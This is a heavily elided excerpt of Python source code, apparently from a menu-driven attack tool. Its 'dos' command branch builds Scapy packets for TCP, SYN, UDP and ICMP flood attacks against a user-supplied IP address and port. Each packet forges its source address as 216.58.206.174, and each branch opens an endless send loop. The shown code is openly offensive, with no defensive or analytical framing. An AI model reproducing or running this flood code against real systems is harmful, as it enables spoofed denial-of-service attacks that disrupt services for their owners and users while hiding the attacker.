    ...
    try:
        ...
        if cmd == '8' or cmd == 'dos':
            ...
            if DosType == "2" or DosType == "TCP" or DosType == "tcp":
                x = 0
                sent = 0
                TCP1 = Ether() / IP(dst=selfIP, src="216.58.206.174") / TCP(dport=DosPort)
                TCP2 = Ether() / IP(dst=IPadress, src="216.58.206.174") / TCP(dport=DosPort)
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
            ...
            if DosType == "3" or DosType == "SYN" or DosType == "syn":
                x = 0
                sent = 0
                TCP1 = Ether() / IP(dst=selfIP, src="216.58.206.174") / TCP(dport=DosPort, flags='S')
                TCP2 = Ether() / IP(dst=IPadress, src="216.58.206.174") / TCP(dport=DosPort, flags='S')
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
            ...
            if DosType == "4" or DosType == "UDP" or DosType == "udp":
                x = 0
                sent = 0
                TCP1 = Ether() / IP(dst=selfIP, src="216.58.206.174") / UDP(dport=DosPort)
                TCP2 = Ether() / IP(dst=IPadress, src="216.58.206.174") / UDP(dport=DosPort)
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
            ...
            if DosType == "5" or DosType == "ICMP" or DosType == "icmp" or DosType == 'ping' or DosType == "PING":
                x = 0
                sent = 0
                TCP1 = Ether() / IP(dst=selfIP, src="216.58.206.174") / ICMP()
                TCP2 = Ether() / IP(dst=IPadress, src="216.58.206.174") / ICMP()
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
